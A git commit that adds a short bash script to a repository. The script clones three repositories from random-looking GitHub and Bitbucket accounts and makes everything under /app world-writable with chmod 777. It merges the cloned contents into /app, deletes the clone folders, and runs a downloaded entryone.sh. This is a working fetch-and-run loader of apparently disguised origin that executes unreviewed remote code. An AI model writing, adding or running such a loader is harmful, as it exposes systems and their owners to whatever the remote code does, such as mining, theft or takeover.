977fe616d0022225f25e76b87a45199a1ff22a04
Redss hadfg <130378812+Xarahovihshs@users.noreply.github.com>
2024-08-02 09:38:43 +0530

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,47 @@
+git clone https://rameshkumar015@bitbucket.org/bauw61625c28du3v25wrc28wh2g26wve/0001-of-one.git
+
+sleep 5
+
+git clone https://github.com/koaojwt6wbfsu619/commonrqdtdcji993xci9bitA
+
+sleep 5
+
+git clone https://anandranga038@bitbucket.org/iaiwuwuwi19w62y2h8w62y26wgi18/kfcvarteacobita.git
+
+sleep 5
+
+chmod 777 /app/0001-of-one
+
+chmod 777 /app/kfcvarteacobita
+
+sleep 5
+
+chmod 777 /app/commonrqdtdcji993xci9bitA
+
+cd 0001-of-one && mv /app/0001-of-one/* /app/
+
+rm -fr /app/0001-of-one
+
+rm -fr entryone.sh
+
+sleep 5
+
+cd /app/kfcvarteacobita && mv /app/kfcvarteacobita/* /app/
+
+rm -fr /app/kfcvarteacobita
+
+sleep 5
+
+
+
+
+cd /app/commonrqdtdcji993xci9bitA && mv /app/commonrqdtdcji993xci9bitA/* /app/
+
+rm -fr /app/commonrqdtdcji993xci9bitA
+
+sleep 5
+
+chmod 777 /app/*
+
+cd /app && bash /app/entryone.sh
+
